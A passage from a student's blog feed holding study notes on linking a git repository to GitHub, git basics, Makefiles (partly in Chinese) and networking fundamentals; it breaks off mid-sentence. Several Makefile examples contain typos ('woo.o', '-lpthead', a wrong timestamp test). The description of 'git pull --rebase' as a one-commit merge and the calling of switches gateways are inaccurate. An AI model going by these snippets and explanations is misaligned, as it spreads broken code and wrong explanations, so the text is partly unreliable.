the first implementation method at this time, then git add, commit, push?"></a><u>Ask a question: Can we directly create test files according to the first implementation method at this time, then git add, commit, push?</u></h3><p>Since I asked, it’s definitely not possible😄, let’s try it if you don’t believe me.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.02.15.png"></p><p>Why?</p><p>This may require understanding some basic principles of git. I believe everyone has heard it called distributed version control. Let’s just focus on the four words “version control”. Does your local repository have any version of the remote repository? You need to know that when you create a new repository on GitHub, it has a first version called <u>initial commit</u> (it might not be called this), but in short, I want to say that creation is accompanied by the first initialization commit, but the local doesn’t have it. You might ask, why not, how do you know? Let’s check with git log😜</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.09.01.png"></p><p>Let me explain, this is a commit I made to demonstrate the counterexample I mentioned. Actually, it should be that after git log, there’s nothing.</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h3><p>Just pull the initialization version of the remote repository, as the local base version, that’s what version control is about. git pull is very descriptive</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.13.45.png"></p><p>It prompts that this operation is unsuccessful because I have a test.txt file, and the first commit of the local repository is different from the initial version of the remote repository, so it prompts me about divergent branches, blah blah blah, as its prompt says, you can use <code>git pull --rebase lixiang main</code></p><p>You might not know what this <code>--rebase</code> does, it’s actually branch merge commit, directly merging the remote repository and local repository regardless, and making one commit.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.22.04.png"></p><p>Success! Let’s check with git log……</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.23.03.png"></p><p>It can be seen that the Initial commit of the remote repository has been merged with my first local commit, but the remote and local repositories are not synchronized at this time! Need to upload to the remote repository.</p><h3 id="Step3-git-push"><a href="#Step3-git-push" class="headerlink" title="Step3: git push"></a>Step3: git push</h3><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.28.42.png"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.29.24.png"></p><p>Success, there’s a small issue that the branch has changed. The reason here is that the default branch for local initialization is master, while the default branch for the remote repository is main. But it’s not a big problem.</p><p>Command to modify default branch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global init.defaultBranch &lt;default branch name&gt;</span><br></pre></td></tr></table></figure><p>If you don’t understand the above process, it’s okay, I made it complicated, it should actually be simpler, no problem, let me write a simple version.</p><h2 id="Simplification-of-the-Second-Method"><a href="#Simplification-of-the-Second-Method" class="headerlink" title="Simplification of the Second Method"></a>Simplification of the Second Method</h2><h3 id="Step1-Create-remote-repository-and-initialize-local-repository"><a href="#Step1-Create-remote-repository-and-initialize-local-repository" class="headerlink" title="Step1: Create remote repository and initialize local repository"></a>Step1: Create remote repository and initialize local repository</h3><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.35.31.png"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.36.50.png"></p><h3 id="Step2-Manually-establish-remote-connection"><a href="#Step2-Manually-establish-remote-connection" class="headerlink" title="Step2: Manually establish remote connection"></a>Step2: Manually establish remote connection</h3><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.43.25.png"></p><h3 id="Step3-Pull-git-pull-the-initial-version-of-the-remote-repository"><a href="#Step3-Pull-git-pull-the-initial-version-of-the-remote-repository" class="headerlink" title="Step3: Pull (git pull) the initial version of the remote repository"></a>Step3: Pull (git pull) the initial version of the remote repository</h3><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.44.13.png"></p><p>If you read my previous explanation, you’ll find that the <code>--rebase</code> parameter is not needed, because after initialization I did nothing, the commit record is empty, and an empty repository of course won’t produce any divergence when pulling anything. With an empty repository, there’s no such thing as merging!</p><p>Let’s check with git log</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.47.04.png"></p><p>Exactly! The final step!😬</p><h3 id="Step4-After-creating-test-files-git-push-upload-to-remote-repository"><a href="#Step4-After-creating-test-files-git-push-upload-to-remote-repository" class="headerlink" title="Step4: After creating test files, git push upload to remote repository"></a>Step4: After creating test files, git push upload to remote repository</h3><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.51.01.png"></p><p>Let’s check on GitHub</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.51.47.png"></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>I think what I said is just the tip of the iceberg, step-by-step teaching how to connect local and remote repositories and commit files you want to upload. Actually, GitHub supports direct file upload, see the <u>Add File</u> in the above image. I learned this without any particular purpose, just found it quite interesting. If you want to learn more deeply, you can refer to my <a href="https://hustlixiang21.github.io/2022/07/05/git%E5%85%A5%E9%97%A8/">previous blog post</a></p><p>By the way, this article is basically all written by me, but I definitely read many, many other people’s viewpoints and kept making mistakes myself, but that’s how learning works. I’ll attach a few original articles I referenced here.</p><p><a href="https://zhuanlan.zhihu.com/p/359108193">Zhihu_Git Usage (Connecting Remote Repository)</a></p><p><a href="https://blog.csdn.net/phily123/article/details/121160072">CSDN_Delete Remote Repository Files</a></p><p><a href="https://blog.csdn.net/A496608119/article/details/123566231">CSDN_Git Local File Upload to Remote Repository</a></p><p><a href="https://blog.csdn.net/u014630142/article/details/120261403">CSDN_Delete Git Remote Repository Files</a></p><p>Take a careful look at what they wrote, it might be clearer than what I wrote. My purpose is still to establish connections step by step through my own understanding of the principles and processes. This can be said to be my first blog post that’s also somewhat of a tutorial. Thanks for watching!</p>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> git </tag>
            
            <tag> CS Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git Introduction</title>
      <link href="/2022/07/05/Git%20Introduction/"/>
      <url>/2022/07/05/Git%20Introduction/</url>
      
        <content type="html"><![CDATA[<h1 id="Git-Introduction"><a href="#Git-Introduction" class="headerlink" title="Git Introduction"></a>Git Introduction</h1><p>Based on Tsinghua University’s summer training for some hands-on practice, referencing the book <a href="https://git-scm.com/book/en/v2">Pro Git</a>.</p><p>Also recommend a <a href="https://learngitbranching.js.org/?locale=zh_CN">quick start website</a> that can better enhance understanding of branches.</p><span id="more"></span><h2 id="What-is-Git"><a href="#What-is-Git" class="headerlink" title="What is Git?"></a>What is Git?</h2><p>Git is an open-source distributed version control system for agile and efficient project handling.</p><h3 id="Version-Control"><a href="#Version-Control" class="headerlink" title="Version Control"></a>Version Control</h3><p>Can easily restore things in the repository to the previous <strong>commit</strong>.</p><p>Principle: Uses snapshots for version control.</p><h3 id="Distributed"><a href="#Distributed" class="headerlink" title="Distributed"></a>Distributed</h3><p>My understanding is that multiple people on multiple hosts can work on the same development at different times and spaces without affecting each other, and finally submit uniformly.</p><h2 id="Basic-Principles"><a href="#Basic-Principles" class="headerlink" title="Basic Principles"></a>Basic Principles</h2><p>Divided into working directory, staging area, and version library. There is a .git file in the folder, which contains the staging area and version library, while the area outside .git is the working directory.</p><p><img src="https://pic2.zhimg.com/80/v2-99d8bb59ba479252bfae5f71554b33aa_1440w.png" alt="img"></p><h2 id="Case-Demonstration"><a href="#Case-Demonstration" class="headerlink" title="Case Demonstration"></a>Case Demonstration</h2><p>First, use the command line to enter the current folder.</p><p>Need to initialize the current folder to create an empty repository, using the command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p><img src="https://pica.zhimg.com/80/v2-099c25239375be8b37a05910cbc07143_1440w.png" alt="img"></p><p>Add the required files to the staging area:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>Commit files in the staging area to the version library:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit </span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;At this time, the default editor will usually pop up, requiring a description of this commit. Usually, unified standards are needed, written clearly and in detail.&#x3D;&#x3D;</p><p><img src="https://pic1.zhimg.com/80/v2-245d2877ae4fc8dfe9e8b64e3e8081e2_1440w.png" alt="img"></p><h3 id="Some-Common-Commands"><a href="#Some-Common-Commands" class="headerlink" title="Some Common Commands"></a>Some Common Commands</h3><p>View commit logs:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.zhimg.com/80/v2-1025580221e635d84f2ebf13e632c0fe_1440w.png" alt="img"></p><p>View git status, i.e., files in the staging area.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><p><img src="https://pic3.zhimg.com/80/v2-0edf6701fd8e886a2a037d0cc283edb9_1440w.png" alt="img"></p><p>Compare <strong>working directory files</strong> with the last commit and output the differences.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/80/v2-0c8cd096128899e7b95e084d974e0214_1440w.png" alt="img"></p><h3 id="Branches-and-Remote-Operations"><a href="#Branches-and-Remote-Operations" class="headerlink" title="Branches and Remote Operations"></a>Branches and Remote Operations</h3><p>See the website tutorial at the beginning of the article, which is vivid and natural and impressive.</p>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> git </tag>
            
            <tag> CS Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile Introduction</title>
      <link href="/2022/06/19/Makefile%20Introduction/"/>
      <url>/2022/06/19/Makefile%20Introduction/</url>
      
        <content type="html"><![CDATA[<h1 id="Makefile-Concept-Introduction"><a href="#Makefile-Concept-Introduction" class="headerlink" title="Makefile Concept Introduction"></a>Makefile Concept Introduction</h1><p><a href="https://zhuanlan.zhihu.com/p/29910215">Original Zhihu Link</a></p><p><a href="https://www.cnblogs.com/paul-617/p/15501875.html">Blog Explanation Link</a></p><p><a href="https://blog.csdn.net/weixin_38391755/article/details/80380786">Another Explanation</a></p><p>This article mainly introduces how to use the “target-based layering” approach to understand a tool, write a concept, define a design, or deploy a set of code.</p><p>This article is first a “Makefile Introduction”, and then a “Target-based Layering Method Introduction”.</p><span id="more"></span><h2 id="关于程序编译"><a href="#关于程序编译" class="headerlink" title="关于程序编译"></a>关于程序编译</h2><p>Makefile解决的是编译的问题。Makefile最初是用来解决C语言的编译问题的，所以和C的关系特别密切，但并不是说Makefile只能用来解决C的编译问题。你用来处理Java一点问题没有，但对于Java，显然ant比Makefile处理得更好。</p><p>比如说，你有foo.c, bar.c, main.c三个C文件，你要编译成一个app.executable，你会怎么做呢？你会执行这样的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -c foo.c -o foo.o</span><br><span class="line">gcc -Wall -c bar.c -o bar.o</span><br><span class="line">gcc -Wall -c main.c -o main.o</span><br><span class="line">gcc main.o foo.o bar.o -lpthread -o app.executable</span><br></pre></td></tr></table></figure><p>按照程序猿的惯例，凡是要一次次重新执行的命令，都应该写成脚本。所以，简单来说，你会把上面这个命令序列写成一个build.sh，每次编译你只要执行这个脚本问题就解决了。</p><p>但这个脚本有问题，假设我修改了foo.c，但我没有修改bar.c和main.c，那么执行这个脚本是很浪费的，因为它会无条件也重新编译bar.c和main.c。</p><p>这个脚本更合理的写法应该是这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ foo.o -ot foo.c ] &amp;&amp; gcc -Wall -c foo.c -o foo.o</span><br><span class="line">[ bar.o -ot bar.c ] &amp;&amp; gcc -Wall -c bar.c -o bar.o</span><br><span class="line">[ main.o -ot main.o] &amp;&amp; gcc -Wall -c main.c -o main.o</span><br><span class="line">[ app.executable -ot main.o ] &amp;&amp; [ app.executable -ot foo.o ] &amp;&amp; [ app.executable -ot bar.o ] &amp;&amp; gcc main.o foo.o bar.o -lpthread -o app.executable</span><br></pre></td></tr></table></figure><p>如果你面对一个问题，不要尝试重新去定义这个问题，而是看它和原来的问题相比，多出来的问题是什么，尝试解决那个多出来的问题就好了。那么这里，多出来的问题就是文件修改时间比较。这个就是Makefile要解决的基本问题了。我们定义一种新的“脚本语言”（只是不用sh&#x2F;bash&#x2F;tch来解释，而是用make来解释），可以用很简单的方法来说明我们需要做的文件比较。这样上面的脚本就可以写成这个样子了：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample1</span></span><br><span class="line"><span class="section">foo.o: foo.c</span></span><br><span class="line">  gcc -Wall -c foo.c -o foo.o</span><br><span class="line"><span class="section">bar.o: bar.c</span></span><br><span class="line">  gcc -Wall -c bar.c -o woo.o</span><br><span class="line"><span class="section">main.o: main.c</span></span><br><span class="line">  gcc -Wall -c main.c -o main.o</span><br><span class="line"><span class="section">app.executable: foo.o bar.o main.o</span></span><br><span class="line">  gcc main.o foo.o bar.o -lpthread -o app.executable</span><br></pre></td></tr></table></figure><p>上面那个Makefile中，foo.o: foo.c定义了一个**“依赖”<strong>，说明foo.o是靠foo.c编译成的，它后面缩进的那些命令，就是简单的shell脚本，称为</strong>规则(rule)**。而Makefile的作用是定义一组依赖，当被依赖的文件比依赖的文件新，就执行规则。这样，前面的问题就解决了。</p><p>IDE中封装了Makefile得使用，但是想要具体控制特定文件的编译细节，最终仍然需要面对这些问题，IDE和make工具的对比，两者解决的是问题的不同层次。</p><p>Makefile中的依赖定义构成了一个依赖链（树），比如上面这个Makefile中，app.executable依赖于main.o，main.o又依赖于main.c，所以，当你去满足app.executable（这个目标）的依赖的时候，它首先去检查main.o的依赖，直到找到依赖树的叶子节点(main.c），然后进行时间比较。这个判断过程由make工具来完成，所以，和一般的脚本不一样。Makefile的执行过程不是基于语句顺序的，而是基于依赖链的顺序的。<img src="https://pic4.zhimg.com/80/v2-90371e6fcdf8f515a68dab7404ed4f43_1440w.jpg" alt="依赖树"></p><h2 id="phony依赖"><a href="#phony依赖" class="headerlink" title="phony依赖"></a>phony依赖</h2><p>make命令执行的时候，后面跟一个“目标”（不带参数的话默认是第一个依赖的目标），然后以这个目标为根建立整个依赖树。依赖树的每个节点是一个文件，任何时候我们都可以通过比较每个依赖文件和被依赖文件的时间，以决定是否需要执行“规则”</p><p>但有时，我们希望某个规则<strong>总是被执行</strong>。这时，很自然地，我们会定义一下<strong>永远都不会被满足</strong>的依赖。</p><p>可能会这么写：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">test:</span></span><br><span class="line">  DEBUG=1 ./app.executable</span><br></pre></td></tr></table></figure><p>test这个文件永远都不会被产生，所以，你只要执行这个依赖，rule是必然会被执行的。这种形式看起来很好用，但由于make工具默认认为你这是个文件，当它成为依赖链的一部分的时候，很容易造成各种误会和处理误差。</p><p>所以，简化起见，Makefile允许你显式地把一个依赖目标定义为<strong>假的(Phony)</strong>：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: test</span></span><br><span class="line"><span class="section">test:</span></span><br><span class="line"> DEBUG=1 ./app.executable</span><br></pre></td></tr></table></figure><p>这样make工具就不用多想了，也不用检查test这个文件的时间了，反正test就是假的，如果有人依赖它，无条件执行就对了。</p><h2 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h2><p>前面的sample1明显还是有很多多余的成份，这些多余的成份可以简单通过引入“宏”定义来解决，比如上面的Makefile，我们把重复的东西都用宏来写，就成了这样了：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample2</span></span><br><span class="line">CC=gcc -Wall -c</span><br><span class="line">LD=gcc</span><br><span class="line"></span><br><span class="line"><span class="section">foo.o: foo.c</span></span><br><span class="line"> <span class="variable">$(CC)</span> foo.c -o foo.o</span><br><span class="line"><span class="section">bar.o: bar.c</span></span><br><span class="line"> <span class="variable">$(CC)</span> bar.c -o bar.o</span><br><span class="line"><span class="section">main.o: main.c</span></span><br><span class="line"> <span class="variable">$(CC)</span> main.c -o main.o</span><br><span class="line"><span class="section">app.executable: foo.o woo.o main.o</span></span><br><span class="line"> <span class="variable">$(LD)</span> main.o foo.o bar.o -o app.executable</span><br></pre></td></tr></table></figure><p>还是有“多余”的成份在，因为明明依赖中已经写了foo.o了，rule中还要再写一次，我们可以把依赖的对象定义为$@，被依赖的对象定义为$^（这是当前gnumake的设计），这样就可以进一步化简：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample3</span></span><br><span class="line">CC=gcc -Wall -c</span><br><span class="line">LD=gcc</span><br><span class="line"></span><br><span class="line"><span class="section">foo.o: foo.c</span></span><br><span class="line">  <span class="variable">$(CC)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">bar.o: bar.c</span></span><br><span class="line">  <span class="variable">$(CC)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">main.o: main.c</span></span><br><span class="line">  <span class="variable">$(CC)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">app.executable: foo.o woo.o main.o</span></span><br><span class="line">  <span class="variable">$(LD)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>很明显，这还是有重复，我们可以把重复的定义写成通配符：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample4</span></span><br><span class="line">CC=gcc -Wall -c</span><br><span class="line">LD=gcc</span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.c</span></span><br><span class="line"> <span class="variable">$(CC)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">foo.o: foo.c</span></span><br><span class="line"><span class="section">woo.o: woo.c</span></span><br><span class="line"><span class="section">main.o: main.c</span></span><br><span class="line"><span class="section">app.executable: foo.o woo.o main.o</span></span><br><span class="line"> <span class="variable">$(LD)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>实际上，你要化简，还有很多手段，比如gnumake其实是默认定义了一组rule的，上面这个整个你都可以不写，就这样就可以了：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample5</span></span><br><span class="line">LDLIBS=-lpthead</span><br><span class="line">SRC=<span class="variable">$(<span class="built_in">wildcard</span> *.c)</span></span><br><span class="line">OBJ=$(SRC:.c=.o)</span><br><span class="line"><span class="section">app.executable: <span class="variable">$(OBJ)</span></span></span><br><span class="line"><span class="comment">#看不懂</span></span><br></pre></td></tr></table></figure><p>这里其实没有定义.o到.c的依赖，但gnumake默认如果.c存在，.o就依赖对应的.c，而.o到.c的rule，是通过宏默认定义的。你只要修改CC，LDLIBS这类的宏，就能解决大部分问题了。所以你又省掉了一组定义，这就可以写得很短。</p><h2 id="头文件问题"><a href="#头文件问题" class="headerlink" title="头文件问题"></a>头文件问题</h2><p>现在我们把问题搞得复杂一点，增加三个头文件。比如foo.h, bar.h和common.h，前两者定义foo.c和bar.c的对外接口，给main.c使用，common.h定义所有文件都要用到的通用定义（foo.h和woo.h中包含common.h)。这样前面这个sample1就有毛病了。照理说，foo.h更新的时候，foo.o和main.o都需要重新编译，但根据那个定义，根本就没有这个比较。</p><p>我们的定义必须写成这个样子：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample4+</span></span><br><span class="line">CC=gcc -Wall -c</span><br><span class="line">LD=gcc</span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.c</span></span><br><span class="line">  <span class="variable">$(CC)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">foo.o: foo.c foo.h common.h</span></span><br><span class="line"><span class="section">bar.o: bar.c bar.h common.h</span></span><br><span class="line"><span class="section">main.o: main.c foo.h bar.h common.h</span></span><br><span class="line"><span class="section">app.executable: foo.o bar.o main.o</span></span><br><span class="line">  <span class="variable">$(LD)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>(注：这个例子我们在.o.c依赖的规则中使用了$&lt;宏，它和$^的区别是，它不包括依赖列表中的所有文件，而仅仅是列表中的第一个文件）</p><p>这就又增加了复杂度了——头文件包含关系一变化，我就得更新这个Makefile的定义。这带来了升级时的冗余工作。按我们前面考虑一样的策略，我们尝试在已有的名称空间上解决这个问题。Makefile已经可以定义依赖了，但我们不知道这个依赖本身。这个事情谁能解决？——把这个过程想一下——其实已经有人解决这个问题了，这个包含关系谁知道嘛？当然是编译器。编译器都已经用到那个头文件了，当然是它才知道这种包含关系是什么样的。比如gcc本身直接就提供了-M系列参数，可以自动帮你生成依赖关系。比如你执行gcc -MM foo.c就可以得到</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">foo.o: foo.c foo.h common.h</span></span><br></pre></td></tr></table></figure><blockquote><p>本文引自开头的链接，由于能力有限及需求不高，剩余的看的不是很懂，目前就到这里。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS Tools </tag>
            
            <tag> Learning </tag>
            
            <tag> Makefile Basics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Computer Network Fundamentals</title>
      <link href="/2022/06/13/Computer%20Network%20Fundamentals/"/>
      <url>/2022/06/13/Computer%20Network%20Fundamentals/</url>
      
        <content type="html"><![CDATA[<p>Note: This is all preliminary understanding, not in-depth. Will discuss more when we get to computer networks.</p><h1 id="Basic-Concepts"><a href="#Basic-Concepts" class="headerlink" title="Basic Concepts"></a>Basic Concepts</h1><h2 id="Endpoints-and-Sessions"><a href="#Endpoints-and-Sessions" class="headerlink" title="Endpoints and Sessions"></a>Endpoints and Sessions</h2><p>An endpoint refers to a device on the network that can send or receive data. Communication between two endpoints is called a conversation.</p><h2 id="IP-Address"><a href="#IP-Address" class="headerlink" title="IP Address"></a>IP Address</h2><p>32-bit binary number, commonly represented in dotted decimal notation, changes as devices connect to different local area networks. Part consists of network number, another part is host number, determined by subnet mask.</p><h2 id="Subnet-Mask"><a href="#Subnet-Mask" class="headerlink" title="Subnet Mask"></a>Subnet Mask</h2><p>32-bit binary number, in the form of 1111…0000. Performing AND operation with IP address directly gives the network number, performing AND operation with inverted mask and IP address gives the host number.</p><h2 id="MAC-Address"><a href="#MAC-Address" class="headerlink" title="MAC Address"></a>MAC Address</h2><p>48-bit binary number<br>Unique identifier for each host (constant after leaving factory), physical address of network card, has mapping relationship with IP address in local area network. Network card directly determines whether to send to operating system by comparing the target MAC address in data packets.</p><p><strong>The relationship between IP and MAC is similar to mailing address and ID number - mailing address may change, but ID number never changes.</strong></p><span id="more"></span><h2 id="Question-Why-do-we-need-MAC-addresses-when-we-have-IP-addresses"><a href="#Question-Why-do-we-need-MAC-addresses-when-we-have-IP-addresses" class="headerlink" title="Question: Why do we need MAC addresses when we have IP addresses?"></a>Question: Why do we need MAC addresses when we have IP addresses?</h2><p>IP address is equivalent to the recipient address on a package. The courier connects a line from origin to destination through the recipient address, then delivers the package to the recipient through logistics transfers between different regions.<br>MAC address is equivalent to the recipient name on a package. MAC address exists more for confirming the other party’s information. Just like when a package crosses several cities to reach you, the courier needs to confirm with you whether the recipient is correct before handing over the package.<br>For example, students in the same class (abstracted as local area network) all know each other, so communication doesn’t need to rely on student numbers (abstracted as IP address here), just call names (MAC address) directly.</p><p>Although there are IP addresses, they don’t work in local area networks because ARP protocol (Address Resolution Protocol) is used for network addressing, and in local area networks all hosts are visible to each other. (Besides, IP addresses in local area networks are at most used as criteria for hosts receiving packets to determine whether they are the target host when unpacking during ARP broadcasts, thus choosing whether to respond to ARP replies).</p><h2 id="Gateway"><a href="#Gateway" class="headerlink" title="Gateway"></a>Gateway</h2><p>A gateway is a “gateway” that connects one network to another network. It’s a network checkpoint. Examples include switches and routers.<br>Gateway is also called network connector and protocol converter. Default gateway implements network interconnection above the network layer, it’s the most complex network interconnection device, only used for interconnecting networks with different high-level protocols. Gateway structure is similar to routers, the difference is the interconnection layer. Gateways can be used for both WAN and LAN interconnection.</p><p>&#x3D;&#x3D;Note: Due to historical reasons, many TCP&#x2F;IP literature used to call routers used at the network layer as gateways. Today many local area networks use routers for network access, so gateway usually refers to the router’s IP&#x3D;&#x3D;</p><h2 id="TCP-and-UDP"><a href="#TCP-and-UDP" class="headerlink" title="TCP and UDP"></a>TCP and UDP</h2><h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p>Internet protocol suite supports a connectionless transport protocol called User Datagram Protocol (UDP). UDP provides applications with a method to send encapsulated IP data packets without establishing a connection. RFC 768 describes UDP.<br>Internet transport layer has two main protocols that complement each other. The connectionless one is UDP, which does almost nothing special except providing applications with data packet sending functionality and allowing them to structure their own protocols at required levels. The <strong>connection-oriented</strong> one is TCP, which does almost everything.</p><h3 id="TCP-More-powerful-but-also-more-difficult"><a href="#TCP-More-powerful-but-also-more-difficult" class="headerlink" title="TCP (More powerful but also more difficult)"></a>TCP (More powerful but also more difficult)</h3><p>Transmission Control Protocol (TCP) is a connection-oriented, reliable, byte-stream-based transport layer communication protocol, defined by IETF RFC 793.<br>TCP is designed to adapt to layered protocol hierarchies that support multi-network applications. Paired processes in host computers connected to different but interconnected computer communication networks rely on TCP to provide reliable communication services. TCP assumes it can obtain simple, possibly unreliable datagram services from lower-level protocols. In principle, TCP should be able to operate over various communication systems from hard-wired connections to packet-switched or circuit-switched networks.</p><h4 id="Connection-Establishment-and-Termination"><a href="#Connection-Establishment-and-Termination" class="headerlink" title="Connection Establishment and Termination"></a>Connection Establishment and Termination</h4><p><strong>Connection Establishment:</strong><br><img src="https://pic2.zhimg.com/80/v2-58989b47296d51404a93456e33fb8bce_1440w.png" alt="image"><br><strong>Connection Termination:</strong><br><img src="https://pica.zhimg.com/80/v2-ef569f7a16193c4f5ec462900790a730_1440w.png" alt="image"></p><h4 id="Main-Features"><a href="#Main-Features" class="headerlink" title="Main Features"></a>Main Features</h4><p>TCP is a wide area network-oriented communication protocol designed to provide a communication method between two communication endpoints with the following characteristics when communicating across multiple networks:</p><ul><li>Stream-based approach;</li><li>Connection-oriented;</li><li>Reliable communication method;</li><li>Minimize system bandwidth overhead due to retransmission when network conditions are poor;</li><li>Communication connection maintenance is oriented to the two endpoints of communication, without considering intermediate network segments and nodes.</li></ul><p>To meet these characteristics of the TCP protocol, TCP protocol makes the following provisions:<br>①Data fragmentation: Fragment user data at the sender, reassemble at the receiver, TCP determines fragment size and controls fragmentation and reassembly;<br>②Arrival confirmation: When the receiver receives 